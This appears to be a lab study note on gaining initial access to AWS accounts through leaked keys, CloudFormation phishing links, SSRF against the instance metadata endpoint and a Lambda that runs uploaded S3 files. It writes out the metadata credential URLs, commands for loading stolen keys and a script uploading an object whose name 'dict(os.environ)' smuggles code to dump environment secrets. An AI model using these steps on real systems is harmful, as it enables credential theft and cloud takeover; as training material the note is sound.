# AWS IAM Initial Access
- There are four popluar techniques to gain initial access:
	- Leaked Credentials
	- Phishing for Stacksets
	- SSRF to IMDS Instance Profile Credentials
	- Vulnerable Automation

## Leaked Credentials
- Common sources where we can find credentials: Github repositories and Programming Language Package repositories (PyPi)
- A lot of developers do not follow best practices: leave credentials in the source code, forget to remove credentials from repositories, etc.

## Phishing for Stacksets
- AWS CloudFormation has LaunchStack feature, which allows users to deploy IaC with a few clicks
- The URL looks like this
```bash
https://console.aws.amazon.com/cloudformation/home?region=$REGION#/stacks/new?stackName=$STACK_NAME&templateURL=$TEMPLATE_LOCATION
```
- Attackers can craft a phishing link to trick an admin to click and deploy resources in their systems.
- This attack is hard due to a few conditions to be met:
1. The victim must have appropriate permissions in AWS
2. It is very hard to trick an administrator to click the link without examining what the template is (unless the admin has no knowledge of the code or trusted the senders)
3. When resources are deployed, iam privileges are subjected to assertion -> which may raise red flags in the system.

## SSRF to IMDS abuse 
- IMDS (Instance Meta Data Service) is used to display information about 
an EC2 instance. TO retrieve a directory list of informaiton of an EC2, 
run: 

```bash 
curl http://169.254.169.254/latest/meta-data/
``` 

- Assume a web application is vulnerable to SSRF, attackers can leverage the 
attack to retrieve the information of the AWS system. In an input form, enter the following URL to retrieve an Instance Profile credentials:

```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials
```

- Retrieve the credentials of the role

```bash
https://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

- Once we get the credentials, configure the account in the Attacking Machine

```bash
aws configure set aws_access_key_id $ACCESS_KEY_ID --profile THM
aws configure set aws_secret_access_key $SECRET_ACCESS_KEY --profile THM
aws configure set aws_session_token $SESSION_TOKEN --profile THM
```

## Abusing "DevOps" Infrastructure
- Assume there is a Lambda function that execute whatever script uploaded to S3 bucket. We can take advantage of this to upload malicious code so the Lambda function execute.
- Enumerate S3 bucket
```bash
aws s3 ls
```

- Upload the file
```bash
aws s3 cp test.txt s3://$ACCOUNT_ID
```

- Confirm the file is uploaded
```bash
aws s3 ls $ACCOUNT_ID
```

- [Lambda Request Context](https://docs.aws.amazon.com/lambda/latest/dg/python-context.html) provides the information related to teh Execution Environment where the serverless function runs in AWS. Like EC2 Instace Profile, we can also provision a Lambda "Execution Role", which gives the Lambda function permissions in AWS, against AWS services based on the permissions provisioned to the role.

- To gain credentials, use the following script

```python
#!/usr/bin/env python3
import boto3
import time

# Request user profile
profile = input(f'Please enter your current AWS Profile: ')
if profile != None:
    session = boto3.session.Session(profile_name=profile)
    s3 = boto3.client('s3')
else:
    session = boto3.session.Session(profile_name="default")
    s3 = boto3.client('s3')

# Use 
bucket_name = session.client('sts').get_caller_identity().get('Account')
real_bucket_name = bucket_name + "-2"
filename = 'dict(os.environ)'

# Create object that represents s3resource access.
s3resource = session.resource('s3')
my_bucket = s3resource.Bucket(real_bucket_name)

# Upload empty files with malicious filenames to s3 bucket
response = s3.put_object(Bucket=real_bucket_name, Key=filename, Body='This is a test file.')
time.sleep(5)

# Retrieve the files in your s3 bucket (note: the files ending in .log are the returned files from the automation)
# Retrieve the files in your s3 bucket
for obj in my_bucket.objects.all():
    s3.get_object(Bucket=real_bucket_name, Key=obj.key)
    s3_url = f"s3://{obj.bucket_name}/{obj.key}"
    print('\n', s3_url, '\n')
```

- When the script runs, a log file will be created and stored in S3.
```bash
aws s3 cp s3://{timestamped_url} .
```
